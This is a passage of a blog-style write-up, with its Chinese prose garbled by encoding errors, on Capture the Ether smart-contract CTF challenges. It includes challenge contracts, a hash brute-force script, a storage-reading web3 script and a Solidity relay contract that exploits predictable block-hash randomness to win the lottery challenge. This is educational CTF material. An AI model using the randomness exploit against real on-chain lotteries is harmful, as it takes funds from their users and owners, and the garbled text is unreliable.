href="https://www.youtube.com/watch?v=7ou6MoKmxFQ">Call On Me</a>.</p><p><strong>è§£é¢˜</strong></p><p>é¢˜ç›®è¦è®©æˆ‘ä»¬éƒ¨ç½²åˆçº¦åï¼Œè°ƒç”¨ <code>callme</code> è¿™ä¸ªå‡½æ•°ï¼Œæ„æ€è®©æˆ‘ä»¬å°è¯•ä¸éƒ¨ç½²åçš„åˆçº¦è¿›è¡Œäº¤äº’ã€‚</p><ol><li>éƒ¨ç½²é¢˜ç›®åˆçº¦ï¼Œ å¾—åˆ°ä¸€ä¸ª challenge åœ°å€</li></ol><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-550eea2a0bea461439192544c34f6771-5ebe66.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-550eea2a0bea461439192544c34f6771-5ebe66.png"></a><br>2. å®‰è£… remix-ide ç¼–è¾‘å™¨ï¼Œæˆ–è€…ä½¿ç”¨åœ¨çº¿çš„ï¼š <a href="https://remix.ethereum.org/#optimize=false&runs=200&evmVersion=null&version=soljson-v0.4.26+commit.4563c3fc.js&language=Solidity">Remix - Ethereum IDE</a></p><p>éƒ¨ç½²é¢˜ç›®åˆçº¦ç”¨æ¥äº¤äº’è°ƒç”¨ challenge çš„ callme å‡½æ•°</p><p>éƒ¨ç½²æ–¹æ³•å¦‚ä¸‹</p><ul><li><p>åœ¨æ–‡ä»¶ç¼–è¾‘å™¨ä¸­ï¼Œ contracts æ–‡ä»¶ä¸­æ–°å»º <code>callme.sol</code>ï¼Œ å†…å®¹å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract CallMeChallenge &#123;</span><br><span class="line">    bool public isComplete &#x3D; false;</span><br><span class="line"></span><br><span class="line">    function callme() public &#123;</span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>è½¬åˆ°ç¼–è¯‘ç•Œé¢ï¼Œè®¾ç½®ç¼–è¯‘å™¨ç‰ˆæœ¬ï¼Œç„¶åé€‰æ‹©ä¸‹æ–¹çš„ç¼–è¯‘</p></li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-f4a985f504ea256b93d83a333dd60b8f-4b452a.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-f4a985f504ea256b93d83a333dd60b8f-4b452a.png"></a></p><ul><li>è½¬åˆ°éƒ¨ç½²ç•Œé¢</li></ul><p>é€‰æ‹© <code>injected web3</code> , ç‚¹å‡»éƒ¨ç½²ï¼Œ å¡«å…¥ <code>At address</code> , ç„¶åå°±èƒ½è°ƒç”¨å¯¹åº”å…¬å¼€æ–¹æ³•</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-8793ce48ab30802bd5763d0217f0041d-4251d5.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-8793ce48ab30802bd5763d0217f0041d-4251d5.png"></a></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œè°ƒç”¨ callme çš„æ—¶å€™è®°å¾—çœ‹æ¸…æ¥šè°ƒç”¨çš„åˆçº¦åœ°å€ï¼Œ åƒå›¾ä¸­è¿™ä¸ªåœ°æ–¹å…¶å®è°ƒç”¨çš„æ–¹æ³•ä¸å¯¹ã€‚åº”è¯¥åœ¨ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªcallme</p><h3 id="3-Choose-a-nickname"><a href="#3-Choose-a-nickname" class="headerlink" title="3. Choose a nickname"></a>3. Choose a nickname</h3><p><strong>é¢˜ç›®æè¿°</strong></p><p>WARMUP: 200 POINTS</p><p><a href="https://capturetheether.com/challenges/warmup/nickname/#">Begin Challenge</a></p><p>Itâ€™s time to set your Capture the Ether nickname! This nickname is how youâ€™ll show up on theÂ <a href="https://capturetheether.com/leaderboard/">leaderboard</a>.</p><p>TheÂ <code>CaptureTheEther</code>Â smart contract keeps track of a nickname for every player. To complete this challenge, set your nickname to a non-empty string. The smart contract is running on the Ropsten test network at the addressÂ <code>0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee</code>.</p><p>Hereâ€™s the code for this challenge:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Relevant part of the CaptureTheEther contract.</span><br><span class="line">contract CaptureTheEther &#123;</span><br><span class="line">    mapping (address &#x3D;&gt; bytes32) public nicknameOf;</span><br><span class="line"></span><br><span class="line">    function setNickname(bytes32 nickname) public &#123;</span><br><span class="line">        nicknameOf[msg.sender] &#x3D; nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Challenge contract. You don&#39;t need to do anything with this; it just verifies</span><br><span class="line">&#x2F;&#x2F; that you set a nickname for yourself.</span><br><span class="line">contract NicknameChallenge &#123;</span><br><span class="line">    CaptureTheEther cte &#x3D; CaptureTheEther(msg.sender);</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Your address gets passed in as a constructor parameter.</span><br><span class="line">    function NicknameChallenge(address _player) public &#123;</span><br><span class="line">        player &#x3D; _player;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check that the first character is not null.</span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return cte.nicknameOf(player)[0] !&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=9YZXPs8uAB0">Say My Name</a>.</p><p><strong>è§£é¢˜</strong></p><p>é¢˜ç›®è¦æ±‚æˆ‘ä»¬è®¾ç½®æˆ‘ä»¬çš„ <code>nickname</code>, è°ƒç”¨ <code>setNickName</code> æ–¹æ³•å³å¯ï¼Œ ä½†æ˜¯è¿™é‡Œå‡½æ•°ä¼ å…¥çš„ç±»å‹ä¸º <code>bytes32</code> , æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬çš„æˆ‘ä»¬çš„ nickname è½¬ä¸º <code>bytes32</code> ï¼Œ æˆ‘è¿™é‡Œä½¿ç”¨åœ¨çº¿çš„ç½‘ç«™è¿›è¡Œè½¬æ¢</p><p><a href="https://www.testcoins.io/str-bytes32">String To Bytes32 Online Converter (testcoins.io)</a></p><p>è½¬å®Œä¹‹åï¼Œ åœ¨ remix-ide ä¸­è°ƒç”¨ <code>setNickName</code> æ–¹æ³•</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-21fdb0e204edd8a0f6cd58478bfe25c0-66ee4f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-21fdb0e204edd8a0f6cd58478bfe25c0-66ee4f.png"></a></p><h2 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h2><h3 id="1-Guesst-the-number"><a href="#1-Guesst-the-number" class="headerlink" title="1. Guesst the number"></a>1. Guesst the number</h3><p><strong>é¢˜ç›®æè¿°</strong></p><p>Iâ€™m thinking of a number. All you have to do is guess it.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNumberChallenge &#123;</span><br><span class="line">    uint8 answer &#x3D; 42;</span><br><span class="line"></span><br><span class="line">    function GuessTheNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=jgJPSjt1L1M">Guessing Games</a>.</p><p><strong>è§£é¢˜</strong></p><p>è®©æˆ‘çŒœ <code>answer</code> çš„å€¼æ˜¯å¤šå°‘ï¼Œ å¦‚æœçŒœå¯¹åˆ™ <code>tansfer</code> , ä»£ç é‡Œçš„ <code>answer</code> æ˜¯å†™æ­»çš„ 42 ï¼Œé‚£ä¹ˆçŒœ 42 å³å¯ ã€‚ç„¶åä»£ç ä¸­è¦æ±‚ <code>msg.value</code>  è¦æ±‚è¦ä¸€ä¸ª <code>1 ether</code></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-62eea18b0be641282b2ff4dec27694cd-22b2a1.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-62eea18b0be641282b2ff4dec27694cd-22b2a1.png"></a></p><h3 id="2-Guess-the-secret-number"><a href="#2-Guess-the-secret-number" class="headerlink" title="2.  Guess the secret number"></a>2.  Guess the secret number</h3><p><strong>é¢˜ç›®æè¿°</strong>ï¼š</p><p>Putting the answer in the code makes things a little too easy.</p><p>This time Iâ€™ve only stored the hash of the number. Good luck reversing a cryptographic hash!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheSecretNumberChallenge &#123;</span><br><span class="line">    bytes32 answerHash &#x3D; 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line"></span><br><span class="line">    function GuessTheSecretNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        if (keccak256(n) &#x3D;&#x3D; answerHash) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=uc6f_2nPSX8">Mr. Roboto</a>.</p><p><strong>è§£é¢˜</strong></p><p>è¦æ±‚ <code>keccak256(n) == 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</code>, n ä¸ºç”¨æˆ·è¾“å…¥ï¼Œä¸” <code>msg.value == 1 ether</code></p><p>n çš„å€¼ä¸º uint 8 , åˆ™èŒƒå›´ä¸º 0 - 256ï¼Œ å†™ä¸€ä¸ªè„šæœ¬çˆ†ç ´ä¸‹ï¼Œçˆ†ç ´è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> Web3.keccak(i).hex() == <span class="string">&#x27;0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365&#x27;</span>:</span><br><span class="line"><span class="meta">... </span>        print(i)</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">break</span></span><br><span class="line"><span class="number">170</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>solidity è„šæœ¬å‚è€ƒ @0x9k PDF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract Test &#123;</span><br><span class="line">    bytes32 answerHash &#x3D; 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line"></span><br><span class="line">    function guess() public returns(uint8) &#123;</span><br><span class="line">        for (uint8 n &#x3D; 0; n&lt; 255; n++)</span><br><span class="line">        if (keccak256(n) &#x3D;&#x3D; answerHash) &#123;</span><br><span class="line"></span><br><span class="line">return n; &#125;</span><br><span class="line"></span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-67a2ecc8954a228373b96eb021fe2d8a-8abc44.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-67a2ecc8954a228373b96eb021fe2d8a-8abc44.png"></a></p><blockquote><p>PSï¼š  é‡åˆ°äº†ä¸€ä¸ª Python3 Cryptodome åº“çš„ keccak256 å’Œ solidity è·‘å‡ºæ¥ç»“æœä¸ä¸€è‡´çš„é—®é¢˜<br><a href="https://ethereum.stackexchange.com/questions/30931/python-and-solidity-keccak256-function-gives-different-results">Python and Solidity keccak256 function gives different results </a></p></blockquote><p><strong>å‚è€ƒæ–‡æ¡£</strong></p><p><a href="https://web3py.readthedocs.io/en/stable/web3.main.html">Web3 API â€” Web3.py 5.28.0 documentation (web3py.readthedocs.io)</a></p><h3 id="3-Guess-the-random-number"><a href="#3-Guess-the-random-number" class="headerlink" title="3.   Guess the random number"></a>3.   Guess the random number</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>This time the number is generated based on a couple fairly random sources.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheRandomNumberChallenge &#123;</span><br><span class="line">    uint8 answer;</span><br><span class="line"></span><br><span class="line">    function GuessTheRandomNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=9ZkzZIUiHzs">The Random Song</a>.</p><p><strong>è§£é¢˜</strong></p><p>è¯¥é¢˜ä¸ä¸Šä¸€ä¸ªé¢˜çš„åŒºåˆ«æ˜¯ï¼Œ è¿™ä¸ªé¢˜ç›®çš„ answer ç”± <code>uint8(keccak256(block.blockhash(block.number - 1), now));</code> è®¡ç®—è€Œå¾—ã€‚æœäº†ä¸‹ç›¸å…³ api ï¼Œ è¿™ä¸ªä»£ç ç‰ˆæœ¬ä¸º 0.4.21 ï¼š</p><ul><li><code>block.blockhash()</code>Â is nowÂ <code>blockhash()</code>Â hash of the given block whenÂ <code>blocknumber</code>Â is one of the 256 most recent blocks; otherwise returns zero</li><li><code>now</code>Â isÂ <code>block.timestamp</code> : current block number</li><li><code>block.number</code>Â (<code>uint</code>): current block number</li></ul><p>ç”±äºåˆçº¦çš„å†…å®¹éƒ½æ˜¯å…¬å¼€çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨åˆçº¦å¯¹åº”çš„ <code>stroge</code> é‡Œæ‰¾åˆ° numberã€‚ è¿™é‡Œæœ‰å‡ ç§æ–¹æ¡ˆ</p><ol><li>ç”¨ solidity å†™ä¸€ä¸ªäº¤äº’ä»£ç </li><li>ç”¨ Python çš„ web3 å†™ä¸€ä¸ªè„šæœ¬</li></ol><p>æˆ‘è¿™é‡Œä½¿ç”¨ web3 å†™ä¸€ä¸ªäº¤äº’è„šæœ¬ï¼Œç”±äºweb3.py å› ä¸ºè‡ªèº«ä¸ä¼šä½œä¸ºä¸€ä¸ªåŒºå—é“¾çš„èŠ‚ç‚¹å­˜åœ¨ï¼Œå› æ­¤å®ƒéœ€è¦æœ‰ä¸€ä¸ªèŠ‚ç‚¹ç”¨æ¥å­˜å–åŒºå—é“¾ä¸Šçš„èµ„æ–™ã€‚ä¸€èˆ¬æ¥è¯´æœ€å®‰å…¨çš„æ–¹å¼åº”è¯¥æ˜¯è‡ªå·±ä½¿ç”¨ geth æˆ–è€… parity æ¥è‡ªå»ºèŠ‚ç‚¹ï¼Œä¸è¿‡å¦‚æœåœ¨ä¸æƒ³è¦è‡ªå»ºèŠ‚ç‚¹çš„çŠ¶å†µæ—¶ï¼Œå¯ä»¥è€ƒè™‘çœ‹çœ‹ infura æä¾›çš„ HTTP èŠ‚ç‚¹æœåŠ¡ã€‚</p><p>æˆ‘è¿™é‡Œåˆ° <a href="https://infura.io/dashboard/ethereum/d9f539bb96ba42c083d610b61d9be812/settings">Infura</a> æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œ ç„¶åè·å–å¯¹åº”çš„ API Key</p><p>è„šæœ¬å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">infura_url = <span class="string">&#x27;https://mainnet.infura.io/v3/[api_key]&#x27;</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(infura_url)) </span><br><span class="line"></span><br><span class="line">address = <span class="string">&#x27;XXXX&#x27;</span> <span class="comment"># blockchain address ï¼Œ é¢˜ç›®éƒ¨ç½²åçš„åœ°å€</span></span><br><span class="line">a = web3.eth.getStorageAt(address, <span class="number">1</span>)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p><strong>å‚è€ƒèµ„æ–™</strong></p><p><a href="https://web3py.readthedocs.io/en/stable/web3.eth.html?highlight=getStorageAt#web3.eth.Eth.getStorageAt">web3.eth API â€” Web3.py 5.28.0 documentation (web3py.readthedocs.io)</a><br><a href="https://betterprogramming.pub/capture-the-ether-guess-the-random-number-2ebb8c9c0347">Capture Ether: Guess the Random Number on a Smart Contract | by TomÃ¡s | Better Programming</a><br><a href="https://medium.com/@saurfang/lets-play-capture-the-ether-lotteries-part-i-4e0b40687efd">Letâ€™s Play â€” Capture the Ether : Lotteries (Part I) | by Forest Fang | Medium</a><br><a href="https://developer.51cto.com/article/706745.html">é€šè¿‡ web3.py ç”¨ Python å­˜å– Ethereum-51CTO.COM</a></p><h3 id="4-Guess-the-new-number"><a href="#4-Guess-the-new-number" class="headerlink" title="4. Guess the new number"></a>4. Guess the new number</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>The number is now generated on-demand when a guess is made.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberChallenge &#123;</span><br><span class="line">    function GuessTheNewNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        if (n &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=Qu3aqM1BnLc">I Guess Itâ€™s Christmas Time</a>.</p><p><strong>é¢˜è§£ï¼š</strong></p><p>è¿™ä¸ªé¢˜ç›®çš„éšæœºæ•°æ˜¯åœ¨ guess å‡½æ•°è°ƒç”¨çš„æ—¶å€™ç”Ÿæˆçš„ã€‚ å³é¢˜ç›®æè¿°ä¸­ çš„ <em>generated on-demand when a guess is made</em> , å› æ­¤æˆ‘ä»¬æ²¡æ³•ç›´æ¥è·å–æ”¹éšæœºå€¼ã€‚ä»”ç»†é˜…è¯»ä»£ç æˆ‘ä»¬å‘ç°ï¼Œ <code>answer</code> ç”±ä»£ç  <code>uint8(keccak256( block.blockhash(block.number - 1), now));</code> ç”Ÿæˆ ã€‚é€šè¿‡æŸ¥é˜…ç›¸å…³èµ„æ–™æˆ‘ä»¬å‘ç°ï¼š</p><blockquote><p><strong>block.blockhash(block.number-1)</strong></p><p>æœ‰ä¸€äº›åˆçº¦åˆ™åŸºäºè´Ÿä¸€é«˜åº¦åŒºå—åŒºå—å“ˆå¸Œæ¥äº§ç”Ÿä¼ªéšæœºæ•°ï¼Œè¿™ä¹Ÿæ˜¯æœ‰ç¼ºé™·çš„ã€‚æ”»å‡»åˆçº¦åªè¦ä»¥ç›¸åŒä»£ç æ‰§è¡Œï¼Œå³å¯ä»¥äº§ç”Ÿåˆ°åŒæ ·çš„ä¼ªéšæœºæ•°ã€‚</p><p>ç¤ºä¾‹ï¼š&lt;Â <a href="https://etherscan.io/address/0xF767fCA8e65d03fE16D4e38810f5E5376c3372A8">https://etherscan.io/address/0xF767fCA8e65d03fE16D4e38810f5E5376c3372A8</a>&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Generate random number between 0 &amp; maxuint256 constant private FACTOR &#x3D; Â 1157920892373161954235709850086879078532699846656405640394575840079131296399;function rand(uint max) constant private returns (uint256 result)&#123;Â Â uint256 factor &#x3D; FACTOR * 100 &#x2F; max;Â Â uint256 lastBlockNumber &#x3D; block.number - 1;Â Â uint256 hashVal &#x3D; uint256(block.blockhash(lastBlockNumber));Â Â return uint256((uint256(hashVal) &#x2F; factor)) % max;&#125;</span><br></pre></td></tr></table></figure></blockquote><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦å†™ä¸€ä¸ªä¸­ç»§åˆçº¦ï¼Œé€šè¿‡ä¸­ç»§åˆçº¦è°ƒç”¨ç›®æ ‡åˆçº¦çš„ç›¸å…³å‡½æ•°ï¼Œå³å¯ã€‚ä¸­ç»§åˆçº¦éœ€è¦ç”¨åˆ° <a href="https://docs.soliditylang.org/en/v0.8.10/contracts.html#interfaces">Interfaces)</a>  åˆ©ç”¨ä»£ç å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface GuessTheNewNumberSolve &#123;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberSolver &#123;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    function GuessTheNewNumberSolver() public &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve(address _challengeAddress) public payable &#123;</span><br><span class="line"></span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        GuessTheNewNumberSolve challenge &#x3D; GuessTheNewNumberSolve(_challengeAddress);</span><br><span class="line">        challenge.guess.value(msg.value)(answer);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner) ;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ remix ä¸­éƒ¨ç½²è¯¥åˆçº¦ä»£ç ï¼Œ å¹¶è°ƒç”¨ <code>solve</code> å‡½æ•°</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-02-e6f7fb79074a3e22eb0581838edd3f66-efab90.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-02-e6f7fb79074a3e22eb0581838edd3f66-efab90.png"></a></p><p><strong>å‚è€ƒèµ„æ–™</strong><br><a href="https://www.freebuf.com/vuls/179173.html">ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦ä¸­éšæœºæ•°é¢„æµ‹ - 